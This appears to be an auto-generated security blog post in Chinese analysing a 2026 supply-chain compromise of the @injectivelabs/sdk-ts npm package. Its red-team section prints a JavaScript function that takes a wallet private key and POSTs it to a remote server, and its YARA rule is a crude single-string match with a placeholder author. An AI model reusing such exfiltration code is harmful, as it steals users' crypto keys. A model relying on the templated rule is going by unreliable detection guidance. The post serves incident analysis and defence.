---
layout: post
title:  "Injective Labs GitHub Compromise Pushes Wallet-Key-Stealing npm Packages"
date:   2026-07-10 19:18:56 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Injective Labs SDK 專案的 GitHub 儲存庫攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak (敏感信息洩露)
> * **關鍵技術**: `npm` 套件管理、GitHub 儲存庫安全、供應鏈攻擊

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者通過提交惡意程式碼到 Injective Labs SDK 專案的 GitHub 儲存庫，從而實現了對 `@injectivelabs/sdk-ts` 套件的攻擊。惡意程式碼在 `trackKeyDerivation()` 函數中添加了偽裝的遙測功能，實際上用於竊取用戶的加密貨幣錢包私鑰和助記詞。
* **攻擊流程圖解**:
  1. 攻擊者提交惡意程式碼到 GitHub 儲存庫。
  2. 用戶安裝受影響的 `@injectivelabs/sdk-ts` 套件。
  3. 當用戶使用受影響的套件時，惡意程式碼被觸發，竊取私鑰和助記詞。
  4.竊取的敏感信息通過 HTTPS POST 請求發送到遠程伺服器。
* **受影響元件**: `@injectivelabs/sdk-ts` 套件版本 1.20.21，以及 17 個其他依賴此套件的相關套件。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 GitHub 儲存庫的提交權限。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // 惡意程式碼示例
      function trackKeyDerivation(method, privateKey) {
        // 竊取私鑰和助記詞
        const stolenData = {
          method: method,
          privateKey: privateKey
        };
        // 發送竊取的敏感信息到遠程伺服器
        fetch('https://testnet.archival.chain.grpc-web.injective.network', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(stolenData)
        });
      }
    
    ```
* **繞過技術**: 攻擊者使用了偽裝的遙測功能來隱藏惡意行為，避免被檢測到。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| 套件版本 | `@injectivelabs/sdk-ts@1.20.21` |
| GitHub 儲存庫 | `https://github.com/injective-labs/sdk-ts` |
| 遠程伺服器 | `https://testnet.archival.chain.grpc-web.injective.network` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule InjectiveLabs_Malicious_Package {
        meta:
          description = "Detects the malicious @injectivelabs/sdk-ts package"
          author = "Your Name"
        strings:
          $trackKeyDerivation = "trackKeyDerivation"
        condition:
          $trackKeyDerivation
      }
    
    ```
* **緩解措施**: 更新 `@injectivelabs/sdk-ts` 套件到最新版本 (1.20.23)，並旋轉所有通過受影響套件處理的私鑰和助記詞。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **供應鏈攻擊 (Supply Chain Attack)**: 一種攻擊方式，攻擊者通過攻擊軟件供應鏈中的某個環節（如開源庫或第三方套件）來實現對最終用戶的攻擊。
* **npm 套件管理**: Node.js 的套件管理工具，允許開發者輕鬆地安裝和管理依賴的套件。
* **GitHub 儲存庫安全**: GitHub 儲存庫的安全性，包括提交權限、代碼審查等方面的安全措施。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/injective-labs-github-compromise-pushes.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1195/)


